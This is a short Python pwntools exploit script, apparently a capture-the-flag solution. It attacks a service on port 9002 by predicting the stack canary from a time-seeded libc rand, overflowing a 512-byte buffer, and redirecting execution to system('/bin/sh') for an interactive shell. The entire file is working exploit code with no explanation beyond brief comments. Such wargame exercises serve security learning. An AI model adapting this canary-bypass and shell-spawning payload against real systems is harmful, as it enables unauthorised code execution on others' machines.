from pwn import *
from ctypes import *
import os, time

# This works in ssh connection (not nc from external)
p = remote('0', 9002)
p.recvuntil(': ')
captcha = p.recvuntil("\n")[:-1]
p.sendline(captcha)
print "Captcha: ", captcha


# Calculate Stack Canary
libc = CDLL('libc.so.6')
time = int(time.time())
print "Time: ", time
libc.srand(time)
nums = [libc.rand() for x in range(8)]
canary = int(captcha) - nums[1] - nums[2] + nums[3] - nums[4] - nums[5] + nums[6] - nums[7]
canary &= 0xffffffff
print "Canary: ", hex(canary)


# Write the payload
offset = (512+4+12+4+4+4)/3 * 4         # base64 length is 4/3 of origin string

payload = "A" * 512
payload += p32(canary)
payload += "A" * 12
payload += p32(0x8049187)               # `call system` in main
payload += p32(0x804b0e0 + offset)      # addr of "/bin/sh" in g_buf
payload += "A" * 4                      # dummy

p.sendline(b64e(payload) + "/bin/sh\x00")
p.interactive()
